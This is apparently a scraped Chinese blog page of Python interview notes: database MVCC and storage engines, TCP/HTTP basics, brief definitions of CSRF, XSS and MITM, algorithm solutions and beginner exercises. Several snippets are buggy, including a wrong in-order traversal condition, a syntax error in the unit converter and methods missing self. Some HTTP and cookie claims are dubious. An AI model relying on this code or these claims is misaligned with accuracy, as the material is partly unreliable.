Control，即多版本并发控制，在MVCC协议下，每个读操作会看到一个一致性的snapshot，并且可以实现非阻塞的读。MVCC允许数据具有多个版本，这个版本可以是时间戳或者是全局递增的事务ID，在同一个时间点，不同的事务看到的数据是不同的。 MySQL的innodb引擎是如何实现MVCC的innodb会为每一行添加两个字段，分别表示该行创建的版本和删除的版本，填入的是事务的版本号，这个版本号随着事务的创建不断递增。在repeated read的隔离级别（事务的隔离级别请看这篇文章）下，具体各种数据库操作的实现： select：满足以下两个条件innodb会返回该行数据： 该行的创建版本号小于等于当前版本号，用于保证在select操作之前所有的操作已经执行落地。 该行的删除版本号大于当前版本或者为空。删除版本号大于当前版本意味着有一个并发事务将该行删除了。 insert：将新插入的行的创建版本号设置为当前系统的版本号。 delete：将要删除的行的删除版本号设置为当前系统的版本号。 update：不执行原地update，而是转换成insert + delete。将旧行的删除版本号设置为当前版本号，并将新行insert同时设置创建版本号为当前版本号。 其中，写操作（insert、delete和update）执行时，需要将系统版本号递增。 由于旧数据并不真正的删除，所以必须对这些数据进行清理，innodb会开启一个后台线程执行清理工作，具体的规则是将删除版本号小于当前系统版本的行删除，这个过程叫做purge。 通过MVCC很好的实现了事务的隔离性，可以达到repeated read级别，要实现serializable还必须加锁。 参考：MVCC浅析 6 MyISAM和InnoDBMyISAM 适合于一些需要大量查询的应用，但其对于有大量写操作并不是很好。甚至你只是需要update一个字段，整个表都会被锁起来，而别的进程，就算是读进程都无法操作直到读操作完成。另外，MyISAM 对于 SELECT COUNT(*) 这类的计算是超快无比的。 InnoDB 的趋势会是一个非常复杂的存储引擎，对于一些小的应用，它会比 MyISAM 还慢。他是它支持“行锁” ，于是在写操作比较多的时候，会更优秀。并且，他还支持更多的高级应用，比如：事务。 mysql 数据库引擎: http://www.cnblogs.com/0201zcr/p/5296843.htmlMySQL存储引擎－－MyISAM与InnoDB区别: https://segmentfault.com/a/1190000008227211 网络1 三次握手 客户端通过向服务器端发送一个SYN来创建一个主动打开，作为三次握手的一部分。客户端把这段连接的序号设定为随机数 A。 服务器端应当为一个合法的SYN回送一个SYN&#x2F;ACK。ACK 的确认码应为 A+1，SYN&#x2F;ACK 包本身又有一个随机序号 B。 最后，客户端再发送一个ACK。当服务端受到这个ACK的时候，就完成了三路握手，并进入了连接创建状态。此时包序号被设定为收到的确认号 A+1，而响应则为 B+1。 2 四次挥手注意: 中断连接端可以是客户端，也可以是服务器端. 下面仅以客户端断开连接举例, 反之亦然. 客户端发送一个数据分段, 其中的 FIN 标记设置为1. 客户端进入 FIN-WAIT 状态. 该状态下客户端只接收数据, 不再发送数据. 服务器接收到带有 FIN &#x3D; 1 的数据分段, 发送带有 ACK &#x3D; 1 的剩余数据分段, 确认收到客户端发来的 FIN 信息. 服务器等到所有数据传输结束, 向客户端发送一个带有 FIN &#x3D; 1 的数据分段, 并进入 CLOSE-WAIT 状态, 等待客户端发来带有 ACK &#x3D; 1 的确认报文. 客户端收到服务器发来带有 FIN &#x3D; 1 的报文, 返回 ACK &#x3D; 1 的报文确认, 为了防止服务器端未收到需要重发, 进入 TIME-WAIT 状态. 服务器接收到报文后关闭连接. 客户端等待 2MSL 后未收到回复, 则认为服务器成功关闭, 客户端关闭连接. 图解: http://blog.csdn.net/whuslei/article/details/6667471 3 ARP协议地址解析协议(Address Resolution Protocol)，其基本功能为透过目标设备的IP地址，查询目标的MAC地址，以保证通信的顺利进行。它是IPv4网络层必不可少的协议，不过在IPv6中已不再适用，并被邻居发现协议（NDP）所替代。 4 urllib和urllib2的区别这个面试官确实问过,当时答的urllib2可以Post而urllib不可以. urllib提供urlencode方法用来GET查询字符串的产生，而urllib2没有。这是为何urllib常和urllib2一起使用的原因。 urllib2可以接受一个Request类的实例来设置URL请求的headers，urllib仅可以接受URL。这意味着，你不可以伪装你的User Agent字符串等。 5 Post和GetGET和POST有什么区别？及为什么网上的多数答案都是错的知乎回答 get: RFC 2616 - Hypertext Transfer Protocol – HTTP&#x2F;1.1post: RFC 2616 - Hypertext Transfer Protocol – HTTP&#x2F;1.1 6 Cookie和Session Cookie Session 储存位置 客户端 服务器端 目的 跟踪会话，也可以保存用户偏好设置或者保存用户名密码等 跟踪会话 安全性 不安全 安全 session技术是要使用到cookie的，之所以出现session技术，主要是为了安全。 7 apache和nginx的区别nginx 相对 apache 的优点： 轻量级，同样起web 服务，比apache 占用更少的内存及资源 抗并发，nginx 处理请求是异步非阻塞的，支持更多的并发连接，而apache 则是阻塞型的，在高并发下nginx 能保持低资源低消耗高性能 配置简洁 高度模块化的设计，编写模块相对简单 社区活跃 apache 相对nginx 的优点： rewrite ，比nginx 的rewrite 强大 模块超多，基本想到的都可以找到 少bug ，nginx 的bug 相对较多 超稳定 8 网站用户密码保存 明文保存 明文hash后保存,如md5 MD5+Salt方式,这个salt可以随机 知乎使用了Bcrypy(好像)加密 9 HTTP和HTTPS 状态码 定义 1xx 报告 接收到请求，继续进程 2xx 成功 步骤成功接收，被理解，并被接受 3xx 重定向 为了完成请求,必须采取进一步措施 4xx 客户端出错 请求包括错的顺序或不能完成 5xx 服务器出错 服务器无法完成显然有效的请求 403: Forbidden404: Not Found HTTPS握手,对称加密,非对称加密,TLS&#x2F;SSL,RSA 10 XSRF和XSS CSRF(Cross-site request forgery)跨站请求伪造 XSS(Cross Site Scripting)跨站脚本攻击 CSRF重点在请求,XSS重点在脚本 11 幂等 IdempotenceHTTP方法的幂等性是指一次和多次请求某一个资源应该具有同样的副作用。(注意是副作用) GET http://www.bank.com/account/123456，不会改变资源的状态，不论调用一次还是N次都没有副作用。请注意，这里强调的是一次和N次具有相同的副作用，而不是每次GET的结果相同。GET http://www.news.com/latest-news这个HTTP请求可能会每次得到不同的结果，但它本身并没有产生任何副作用，因而是满足幂等性的。 DELETE方法用于删除资源，有副作用，但它应该满足幂等性。比如：DELETE http://www.forum.com/article/4231，调用一次和N次对系统产生的副作用是相同的，即删掉id为4231的帖子；因此，调用者可以多次调用或刷新页面而不必担心引起错误。 POST所对应的URI并非创建的资源本身，而是资源的接收者。比如：POST http://www.forum.com/articles的语义是在http://www.forum.com/articles下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。 PUT所对应的URI是要创建或更新的资源本身。比如：PUT http://www.forum/articles/4231的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。 12 RESTful架构(SOAP,RPC)推荐: http://www.ruanyifeng.com/blog/2011/09/restful.html 13 SOAPSOAP（原为Simple Object Access Protocol的首字母缩写，即简单对象访问协议）是交换数据的一种协议规范，使用在计算机网络Web服务（web service）中，交换带结构信息。SOAP为了简化网页服务器（Web Server）从XML数据库中提取数据时，节省去格式化页面时间，以及不同应用程序之间按照HTTP通信协议，遵从XML格式执行资料互换，使其抽象于语言实现、平台和硬件。 14 RPCRPC（Remote Procedure Call Protocol）——远程过程调用协议，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层。RPC使得开发包括网络分布式多程序在内的应用程序更加容易。 总结:服务提供的两大流派.传统意义以方法调用为导向通称RPC。为了企业SOA,若干厂商联合推出webservice,制定了wsdl接口定义,传输soap.当互联网时代,臃肿SOA被简化为http+xml&#x2F;json.但是简化出现各种混乱。以资源为导向,任何操作无非是对资源的增删改查，于是统一的REST出现了. 进化的顺序: RPC -&gt; SOAP -&gt; RESTful 15 CGI和WSGICGI是通用网关接口，是连接web服务器和应用程序的接口，用户通过CGI来获取动态数据或文件等。CGI程序是一个独立的程序，它可以用几乎所有语言来写，包括perl，c，lua，python等等。 WSGI, Web Server Gateway Interface，是Python应用程序或框架和Web服务器之间的一种接口，WSGI的其中一个目的就是让用户可以用统一的语言(Python)编写前后端。 官方说明：PEP-3333 16 中间人攻击在GFW里屡见不鲜的,呵呵. 中间人攻击（Man-in-the-middle attack，通常缩写为MITM）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。 17 c10k问题所谓c10k问题，指的是服务器同时支持成千上万个客户端的问题，也就是concurrent 10 000 connection（这也是c10k这个名字的由来）。推荐: https://my.oschina.net/xianggao/blog/664275 18 socket推荐: http://www.360doc.com/content/11/0609/15/5482098_122692444.shtml Socket&#x3D;Ip address+ TCP&#x2F;UDP + port 19 浏览器缓存推荐: http://www.cnblogs.com/skynet/archive/2012/11/28/2792503.html 304 Not Modified 20 HTTP1.0和HTTP1.1推荐: http://blog.csdn.net/elifefly/article/details/3964766 请求头Host字段,一个服务器多个网站 长链接 文件断点续传 身份认证,状态管理,Cache缓存 HTTP请求8种方法介绍HTTP&#x2F;1.1协议中共定义了8种HTTP请求方法，HTTP请求方法也被叫做“请求动作”，不同的方法规定了不同的操作指定的资源方式。服务端也会根据不同的请求方法做不同的响应。 GET GET请求会显示请求指定的资源。一般来说GET方法应该只用于数据的读取，而不应当用于会产生副作用的非幂等的操作中。 GET会方法请求指定的页面信息，并返回响应主体，GET被认为是不安全的方法，因为GET方法会被网络蜘蛛等任意的访问。 HEAD HEAD方法与GET方法一样，都是向服务器发出指定资源的请求。但是，服务器在响应HEAD请求时不会回传资源的内容部分，即：响应主体。这样，我们可以不传输全部内容的情况下，就可以获取服务器的响应头信息。HEAD方法常被用于客户端查看服务器的性能。 POST POST请求会 向指定资源提交数据，请求服务器进行处理，如：表单数据提交、文件上传等，请求数据会被包含在请求体中。POST方法是非幂等的方法，因为这个请求可能会创建新的资源或&#x2F;和修改现有资源。 PUT PUT请求会身向指定资源位置上传其最新内容，PUT方法是幂等的方法。通过该方法客户端可以将指定资源的最新数据传送给服务器取代指定的资源的内容。 DELETE DELETE请求用于请求服务器删除所请求URI（统一资源标识符，Uniform Resource Identifier）所标识的资源。DELETE请求后指定资源会被删除，DELETE方法也是幂等的。 CONNECT CONNECT方法是HTTP&#x2F;1.1协议预留的，能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接与非加密的HTTP代理服务器的通信。 OPTIONS OPTIONS请求与HEAD类似，一般也是用于客户端查看服务器的性能。 这个方法会请求服务器返回该资源所支持的所有HTTP请求方法，该方法会用’*’来代替资源名称，向服务器发送OPTIONS请求，可以测试服务器功能是否正常。JavaScript的XMLHttpRequest对象进行CORS跨域资源共享时，就是使用OPTIONS方法发送嗅探请求，以判断是否有对指定资源的访问权限。 允许 TRACE TRACE请求服务器回显其收到的请求信息，该方法主要用于HTTP请求的测试或诊断。 HTTP&#x2F;1.1之后增加的方法 在HTTP&#x2F;1.1标准制定之后，又陆续扩展了一些方法。其中使用中较多的是 PATCH 方法： PATCH PATCH方法出现的较晚，它在2010年的RFC 5789标准中被定义。PATCH请求与PUT请求类似，同样用于资源的更新。二者有以下两点不同： 但PATCH一般用于资源的部分更新，而PUT一般用于资源的整体更新。当资源不存在时，PATCH会创建一个新的资源，而PUT只会对已在资源进行更新。 21 AjaxAJAX,Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）, 是与在不重新加载整个页面的情况下，与服务器交换数据并更新部分网页的技术。 *NIXunix进程间通信方式(IPC) 管道（Pipe）：管道可用于具有亲缘关系进程间的通信，允许一个进程和另一个与它有共同祖先的进程之间进行通信。 命名管道（named pipe）：命名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，它还允许无亲缘关系进程间的通信。命名管道在文件系统中有对应的文件名。命名管道通过命令mkfifo或系统调用mkfifo来创建。 信号（Signal）：信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；linux除了支持Unix早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction（实际上，该函数是基于BSD的，BSD为了实现可靠信号机制，又能够统一对外接口，用sigaction函数重新实现了signal函数）。 消息（Message）队列：消息队列是消息的链接表，包括Posix消息队列system V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺 共享内存：使得多个进程可以访问同一块内存空间，是最快的可用IPC形式。是针对其他通信机制运行效率较低而设计的。往往与其它通信机制，如信号量结合使用，来达到进程间的同步及互斥。 内存映射（mapped memory）：内存映射允许任何多个进程间通信，每一个使用该机制的进程通过把一个共享的文件映射到自己的进程地址空间来实现它。 信号量（semaphore）：主要作为进程间以及同一进程不同线程之间的同步手段。 套接口（Socket）：更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由Unix系统的BSD分支开发出来的，但现在一般可以移植到其它类Unix系统上：Linux和System V的变种都支持套接字。 数据结构1 红黑树红黑树与AVL的比较： AVL是严格平衡树，因此在增加或者删除节点的时候，根据不同情况，旋转的次数比红黑树要多； 红黑是用非严格的平衡来换取增删节点时候旋转次数的降低； 所以简单说，如果你的应用中，搜索的次数远远大于插入和删除，那么选择AVL，如果搜索，插入删除次数几乎差不多，应该选择RB。 红黑树详解: https://xieguanglei.github.io/blog/post/red-black-tree.html 教你透彻了解红黑树: https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md 编程题1 台阶问题&#x2F;斐波那契一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 1fib = lambda n: n if n &lt;= 2 else fib(n - 1) + fib(n - 2) 第二种记忆方法 1234567891011121314def memo(func): cache = &#123;&#125; def wrap(*args): if args not in cache: cache[args] = func(*args) return cache[args] return wrap@memodef fib(i): if i &lt; 2: return 1 return fib(i-1) + fib(i-2) 第三种方法 12345def fib(n): a, b = 0, 1 for x in range(n): a, b = b, a + b return b 2 变态台阶问题一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 1fib = lambda n: n if n &lt; 2 else 2 * fib(n - 1) 3 矩形覆盖我们可以用2*1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2*1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？ 第2*n个矩形的覆盖方法等于第2*(n-1)加上第2*(n-2)的方法。 1f = lambda n: 1 if n &lt; 2 else f(n - 1) + f(n - 2) 4 杨氏矩阵查找在一个m行n列二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 使用Step-wise线性搜索。 1234567891011121314151617def get_value(l, r, c): return l[r][c]def find(l, x): m = len(l) - 1 n = len(l[0]) - 1 r = 0 c = n while c &gt;= 0 and r &lt;= m: value = get_value(l, r, c) if value == x: return True elif value &gt; x: c = c - 1 elif value &lt; x: r = r + 1 return False 5 去除列表中的重复元素用集合 1list(set(l)) 用字典 123l1 = [&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;a&#x27;]l2 = &#123;&#125;.fromkeys(l1).keys()print l2 用字典并保持顺序 1234l1 = [&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;a&#x27;]l2 = list(set(l1))l2.sort(key=l1.index)print l2 列表推导式 123l1 = [&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;a&#x27;]l2 = [][l2.append(i) for i in l1 if not i in l2] sorted排序并且用列表推导式. l &#x3D; [‘b’,’c’,’d’,’b’,’c’,’a’,’a’][single.append(i) for i in sorted(l) if i not in single]print single 6 链表成对调换1-&gt;2-&gt;3-&gt;4转换成2-&gt;1-&gt;4-&gt;3. 123456789101112131415class ListNode: def __init__(self, x): self.val = x self.next = Noneclass Solution: # @param a ListNode # @return a ListNode def swapPairs(self, head): if head != None and head.next != None: next = head.next head.next = self.swapPairs(next.next) next.next = head return next return head 7 创建字典的方法1 直接创建1dict = &#123;&#x27;name&#x27;:&#x27;earth&#x27;, &#x27;port&#x27;:&#x27;80&#x27;&#125; 2 工厂方法123items=[(&#x27;name&#x27;,&#x27;earth&#x27;),(&#x27;port&#x27;,&#x27;80&#x27;)]dict2=dict(items)dict1=dict(([&#x27;name&#x27;,&#x27;earth&#x27;],[&#x27;port&#x27;,&#x27;80&#x27;])) 3 fromkeys()方法1234dict1=&#123;&#125;.fromkeys((&#x27;x&#x27;,&#x27;y&#x27;),-1)dict=&#123;&#x27;x&#x27;:-1,&#x27;y&#x27;:-1&#125;dict2=&#123;&#125;.fromkeys((&#x27;x&#x27;,&#x27;y&#x27;))dict2=&#123;&#x27;x&#x27;:None, &#x27;y&#x27;:None&#125; 8 合并两个有序列表知乎远程面试要求编程 尾递归 12345678910111213141516def _recursion_merge_sort2(l1, l2, tmp): if len(l1) == 0 or len(l2) == 0: tmp.extend(l1) tmp.extend(l2) return tmp else: if l1[0] &lt; l2[0]: tmp.append(l1[0]) del l1[0] else: tmp.append(l2[0]) del l2[0] return _recursion_merge_sort2(l1, l2, tmp)def recursion_merge_sort2(l1, l2): return _recursion_merge_sort2(l1, l2, []) 循环算法 思路： 定义一个新的空列表 比较两个列表的首个元素 小的就插入到新列表里 把已经插入新列表的元素从旧列表删除 直到两个旧列表有一个为空 再把旧列表加到新列表后面 123456789101112def loop_merge_sort(l1, l2): tmp = [] while len(l1) &gt; 0 and len(l2) &gt; 0: if l1[0] &lt; l2[0]: tmp.append(l1[0]) del l1[0] else: tmp.append(l2[0]) del l2[0] tmp.extend(l1) tmp.extend(l2) return tmp pop弹出 1234567891011121314151617a = [1,2,3,7]b = [3,4,5]def merge_sortedlist(a,b): c = [] while a and b: if a[0] &gt;= b[0]: c.append(b.pop(0)) else: c.append(a.pop(0)) while a: c.append(a.pop(0)) while b: c.append(b.pop(0)) return cprint merge_sortedlist(a,b) 9 交叉链表求交点 其实思想可以按照从尾开始比较两个链表，如果相交，则从尾开始必然一致，只要从尾开始比较，直至不一致的地方即为交叉点，如图所示 1234567891011121314# 使用a,b两个list来模拟链表，可以看出交叉点是 7这个节点a = [1,2,3,7,9,1,5]b = [4,5,7,9,1,5]for i in range(1,min(len(a),len(b))): if i==1 and (a[-1] != b[-1]): print &quot;No&quot; break else: if a[-i] != b[-i]: print &quot;交叉节点：&quot;,a[-i+1] break else: pass 另外一种比较正规的方法，构造链表类 1234567891011121314151617181920212223242526class ListNode: def __init__(self, x): self.val = x self.next = Nonedef node(l1, l2): length1, lenth2 = 0, 0 # 求两个链表长度 while l1.next: l1 = l1.next length1 += 1 while l2.next: l2 = l2.next length2 += 1 # 长的链表先走 if length1 &gt; lenth2: for _ in range(length1 - length2): l1 = l1.next else: for _ in range(length2 - length1): l2 = l2.next while l1 and l2: if l1.next == l2.next: return l1.next else: l1 = l1.next l2 = l2.next 修改了一下: 123456789101112131415161718192021222324252627282930#coding:utf-8class ListNode: def __init__(self, x): self.val = x self.next = Nonedef node(l1, l2): length1, length2 = 0, 0 # 求两个链表长度 while l1.next: l1 = l1.next#尾节点 length1 += 1 while l2.next: l2 = l2.next#尾节点 length2 += 1 #如果相交 if l1.next == l2.next: # 长的链表先走 if length1 &gt; length2: for _ in range(length1 - length2): l1 = l1.next return l1#返回交点 else: for _ in range(length2 - length1): l2 = l2.next return l2#返回交点 # 如果不相交 else: return 思路: http://humaoli.blog.163.com/blog/static/13346651820141125102125995/ 10 二分查找1234567891011121314151617#coding:utf-8def binary_search(list,item): low = 0 high = len(list)-1 while low&lt;=high: mid = (low+high)/2 guess = list[mid] if guess&gt;item: high = mid-1 elif guess&lt;item: low = mid+1 else: return mid return Nonemylist = [1,3,5,7,9]print binary_search(mylist,3) 参考: http://blog.csdn.net/u013205877/article/details/76411718 11 快排123456789101112#coding:utf-8def quicksort(list): if len(list)&lt;2: return list else: midpivot = list[0] lessbeforemidpivot = [i for i in list[1:] if i&lt;=midpivot] biggerafterpivot = [i for i in list[1:] if i &gt; midpivot] finallylist = quicksort(lessbeforemidpivot)+[midpivot]+quicksort(biggerafterpivot) return finallylistprint quicksort([2,4,6,7,1,2,5]) 更多排序问题可见：数据结构与算法-排序篇-Python描述 12 找零问题12345678910111213141516171819#coding:utf-8#values是硬币的面值values = [ 25, 21, 10, 5, 1]#valuesCounts 钱币对应的种类数#money 找出来的总钱数#coinsUsed 对应于目前钱币总数i所使用的硬币数目def coinChange(values,valuesCounts,money,coinsUsed): #遍历出从1到money所有的钱数可能 for cents in range(1,money+1): minCoins = cents #把所有的硬币面值遍历出来和钱数做对比 for kind in range(0,valuesCounts): if (values[kind] &lt;= cents): temp = coinsUsed[cents - values[kind]] +1 if (temp &lt; minCoins): minCoins = temp coinsUsed[cents] = minCoins print (&#x27;面值:&#123;0&#125;的最少硬币使用数为:&#123;1&#125;&#x27;.format(cents, coinsUsed[cents])) 思路: http://blog.csdn.net/wdxin1322/article/details/9501163 方法: http://www.cnblogs.com/ChenxofHit/archive/2011/03/18/1988431.html 13 广度遍历和深度遍历二叉树给定一个数组，构建二叉树，并且按层次打印这个二叉树 14 二叉树节点12345678class Node(object): def __init__(self, data, left=None, right=None): self.data = data self.left = left self.right = righttree = Node(1, Node(3, Node(7, Node(0)), Node(6)), Node(2, Node(5), Node(4))) 15 层次遍历123456def lookup(root): row = [root] while row: print(row) row = [kid for item in row for kid in (item.left, item.right) if kid] 16 深度遍历12345678910def deep(root): if not root: return print root.data deep(root.left) deep(root.right)if __name__ == &#x27;__main__&#x27;: lookup(tree) deep(tree) 17 前中后序遍历深度遍历改变顺序就OK了 12345678910111213141516171819202122232425262728293031323334353637#coding:utf-8#二叉树的遍历#简单的二叉树节点类class Node(object): def __init__(self,value,left,right): self.value = value self.left = left self.right = right#中序遍历:遍历左子树,访问当前节点,遍历右子树def mid_travelsal(root): if root.left is None: mid_travelsal(root.left) #访问当前节点 print(root.value) if root.right is not None: mid_travelsal(root.right)#前序遍历:访问当前节点,遍历左子树,遍历右子树def pre_travelsal(root): print (root.value) if root.left is not None: pre_travelsal(root.left) if root.right is not None: pre_travelsal(root.right)#后续遍历:遍历左子树,遍历右子树,访问当前节点def post_trvelsal(root): if root.left is not None: post_trvelsal(root.left) if root.right is not None: post_trvelsal(root.right) print (root.value) 18 求最大树深1234def maxDepth(root): if not root: return 0 return max(maxDepth(root.left), maxDepth(root.right)) + 1 19 求两棵树是否相同1234567def isSameTree(p, q): if p == None and q == None: return True elif p and q : return p.val == q.val and isSameTree(p.left,q.left) and isSameTree(p.right,q.right) else : return False 20 前序中序求后序推荐: http://blog.csdn.net/hinyunsin/article/details/6315502 123456789101112131415def rebuild(pre, center): if not pre: return cur = Node(pre[0]) index = center.index(pre[0]) cur.left = rebuild(pre[1:index + 1], center[:index]) cur.right = rebuild(pre[index + 1:], center[index + 1:]) return curdef deep(root): if not root: return deep(root.left) deep(root.right) print root.data 21 单链表逆置12345678910111213141516171819202122class Node(object): def __init__(self, data=None, next=None): self.data = data self.next = nextlink = Node(1, Node(2, Node(3, Node(4, Node(5, Node(6, Node(7, Node(8, Node(9)))))))))def rev(link): pre = link cur = link.next pre.next = None while cur: tmp = cur.next cur.next = pre pre = cur cur = tmp return preroot = rev(link)while root: print root.data root = root.next 思路: http://blog.csdn.net/feliciafay/article/details/6841115 方法: http://www.xuebuyuan.com/2066385.html?mobile=1 22 两个字符串是否是变位词12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576class Anagram: &quot;&quot;&quot; @:param s1: The first string @:param s2: The second string @:return true or false &quot;&quot;&quot; def Solution1(s1,s2): alist = list(s2) pos1 = 0 stillOK = True while pos1 &lt; len(s1) and stillOK: pos2 = 0 found = False while pos2 &lt; len(alist) and not found: if s1[pos1] == alist[pos2]: found = True else: pos2 = pos2 + 1 if found: alist[pos2] = None else: stillOK = False pos1 = pos1 + 1 return stillOK print(Solution1(&#x27;abcd&#x27;,&#x27;dcba&#x27;)) def Solution2(s1,s2): alist1 = list(s1) alist2 = list(s2) alist1.sort() alist2.sort() pos = 0 matches = True while pos &lt; len(s1) and matches: if alist1[pos] == alist2[pos]: pos = pos + 1 else: matches = False return matches print(Solution2(&#x27;abcde&#x27;,&#x27;edcbg&#x27;)) def Solution3(s1,s2): c1 = [0]*26 c2 = [0]*26 for i in range(len(s1)): pos = ord(s1[i])-ord(&#x27;a&#x27;) c1[pos] = c1[pos] + 1 for i in range(len(s2)): pos = ord(s2[i])-ord(&#x27;a&#x27;) c2[pos] = c2[pos] + 1 j = 0 stillOK = True while j&lt;26 and stillOK: if c1[j] == c2[j]: j = j + 1 else: stillOK = False return stillOK print(Solution3(&#x27;apple&#x27;,&#x27;pleap&#x27;)) 23 动态规划问题 可参考：动态规划(DP)的整理-Python描述","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python练习","slug":"Python练习","date":"2020-07-08T01:22:15.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/08/Python练习/","permalink":"http://example.com/2020/07/08/Python%E7%BB%83%E4%B9%A0/","excerpt":"python 习题练习","text":"python 习题练习 python练习1.华氏温度转换 （转换公式为：**$C&#x3D;(F - 32) \\div 1.8$**）1234f = float(input(&#x27;请输入温度：&#x27;))c = (f-32)/1.8print(&#x27;%.1f华氏度 = %.1f摄氏度&#x27;%(f,c))print(f&#x27;&#123;f:.1f&#125;华氏度 = &#123;c:.1f&#125;摄氏度&#x27;) 2.输入圆的半径计算圆的面积和周长12345radius = float(input(&#x27;请输入圆的半径：&#x27;))perimeter = 2*3.1416*radiusarea = 3.1416*radius*radiusprint(&#x27;周长：%.2f&#x27;%perimeter)print(&#x27;面积：%.2f&#x27;%area) 3.判断输入年份是否为闰年123year = int(input(&#x27;年份：&#x27;))is_leap = year%4 == 0 and year % 100 !=0 or year % 400 ==0print(is_leap) 4：英制单位英寸与公制单位厘米互换。12345678value = float(input(&#x27;长度:&#x27;))unit = input(&#x27;请输入单位：&#x27;)if unit = &#x27;in&#x27; or unit = &#x27;英寸&#x27;： print(&#x27;%f英寸 = %f厘米&#x27; %(value,value*2.54))elif unit == &#x27;cm&#x27; or unit == &#x27;厘米&#x27;： print(&#x27;%f厘米 = %英寸&#x27; %(value,value/2.54))else: print(&#x27;请输入有效的单位！！&#x27;) 5:百分制成绩转换为等级制成绩。123456789101112score = float(input(&#x27;请输入成绩: &#x27;))if score &gt;= 90: grade = &#x27;A&#x27;elif score &gt;= 80: grade = &#x27;B&#x27;elif score &gt;= 70: grade = &#x27;C&#x27;elif score &gt;= 60: grade = &#x27;D&#x27;else: grade = &#x27;E&#x27;print(&#x27;对应的等级是:&#x27;, grade) 6:输入三条边长，如果能构成三角形就计算周长和面积。1234567891011a = float(input(&#x27;a = &#x27;))b = float(input(&#x27;b = &#x27;))c = float(input(&#x27;c = &#x27;))if a + b &gt; c and a + c &gt; b and b + c &gt; a: print(&#x27;周长: %f&#x27; % (a + b + c)) p = (a + b + c) / 2 area = (p * (p - a) * (p - b) * (p - c)) ** 0.5 print(&#x27;面积: %f&#x27; % (area))else: print(&#x27;不能构成三角形&#x27;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# # 1.# sum = 0# for i in range(0, 101):# sum += i# print(sum)# # 2.# sum = 0# while 1:# for i in range(1,100,2):# print(i)# sum += i# break# print(sum)# # 3.# n = int(input(&#x27;请输入一个小于10的整数：&#x27;))# result = 1# if n &lt; 10 and n !=0:# while 1:# result *= n# n -= 1# if n == 1:# break# print(result)# else:# print(&#x27;输入不合法，请重新输入！！&#x27;)# n = int(input(&#x27;请输入一个小于10的整数：&#x27;))# result = 1# if n &lt; 10 and n !=0:# for i in range(0,n+1):# result *= n# n -= 1# if n == 1:# break# print(result)# else:# print(&#x27;输入不合法，请重新输入！！&#x27;)# # 4.# sum = 0# for i in range(0, 101):# if i % 3 == 0 and i % 5 != 0:# #print(i)# sum +=i# print(sum)# 1368# # 5.cock公鸡 hen母鸡 小鸡chick# cock = 0# hen = 0# for cock in range(1, 101):# for hen in range(1, 101):# chick = 100 - cock - hen# if (chick // 3 + cock * 3 + hen * 2) ==100 and chick % 3 == 0:# print(cock,hen,chick)# # 6.# male = 0# female = 0# for male in range(36):# for female in range(36):# child = 36 - male - female# if (male * 4 + female * 3 + child * 0.5) == 36:# print(male, female, child)# # 7.# for i in range(1000,10000):# cd = i%100# ab = (i-i%100)/100# if (ab+cd)**2 ==i:# print(i)# 2025# 3025# 9801# # 8.# n=int(input(&quot;请输入一个整数:&quot;))# for i in range(n):# print(&quot; &quot;*(n-i-1),end=&#x27;&#x27;)# print(&quot; *&quot;*(2*i+1))# # 9.# for i in range(1,10):# for j in range(1,i+1):# print(j,&#x27;*&#x27;,i,&#x27;=&#x27;,i*j,end=&#x27; &#x27;)# print()# 1 * 1 = 1# 1 * 2 = 2 2 * 2 = 4# 1 * 3 = 3 2 * 3 = 6 3 * 3 = 9# 1 * 4 = 4 2 * 4 = 8 3 * 4 = 12 4 * 4 = 16# 1 * 5 = 5 2 * 5 = 10 3 * 5 = 15 4 * 5 = 20 5 * 5 = 25# 1 * 6 = 6 2 * 6 = 12 3 * 6 = 18 4 * 6 = 24 5 * 6 = 30 6 * 6 = 36# 1 * 7 = 7 2 * 7 = 14 3 * 7 = 21 4 * 7 = 28 5 * 7 = 35 6 * 7 = 42 7 * 7 = 49# 1 * 